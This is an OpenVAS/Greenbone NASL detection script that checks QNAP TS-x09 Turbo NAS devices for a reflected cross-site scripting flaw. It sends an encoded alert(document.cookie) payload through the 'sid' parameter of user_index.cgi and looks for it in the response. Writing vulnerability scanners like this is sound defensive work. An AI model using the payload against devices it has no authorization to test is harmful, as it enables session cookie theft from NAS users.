if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805694" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2015-07-28 11:38:53 +0530 (Tue, 28 Jul 2015)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "QNAP TS_x09 Turbo NAS Devices Reflected Cross-Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host has QNAP TS-x09 Turbo NAS device
  and is prone to reflected cross site scripting vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and
  check whether it is able read the cookie or not" );
	script_tag( name: "insight", value: "The flaw is due to an input passed via
  the 'sid' variable in 'cgi-bin/user_index.cgi' and 'cgi-bin/index.cgi' is not
  properly sanitized." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  unauthenticated attacker to inject arbitrary JavaScript which is executed
  server-side by escaping from the quotation marks." );
	script_tag( name: "affected", value: "QNAP devices,
  TS-109 PRO and TS-109 II Version 3.3.0 Build 0924T
  TS-209 and TS-209 PRO II Version 3.3.3 Build 1003T
  TS-409 and TS-409U Version 3.3.2 Build 0918T." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_xref( name: "URL", value: "http://www.mogozobo.com/?p=2574" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/132840" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2015/Jul/115" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 8080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
nasPort = http_get_port( default: 8080 );
for dir in nasl_make_list_unique( "/", "/cgi-bin", http_cgi_dirs( port: nasPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/html/login.html" ), port: nasPort );
	rcvRes = http_keepalive_send_recv( port: nasPort, data: sndReq );
	if(ContainsString( rcvRes, "Welcome to QNAP Turbo NAS" )){
		url = dir + "/user_index.cgi?sid=%22%3balert%28document.cookie%29%2f%2f";
		if(http_vuln_check( port: nasPort, url: url, pattern: "alert\\(document.cookie\\)", extra_check: "QNAP Turbo NAS", check_header: TRUE )){
			report = http_report_vuln_url( port: nasPort, url: url );
			security_message( port: nasPort, data: report );
			exit( 0 );
		}
	}
}

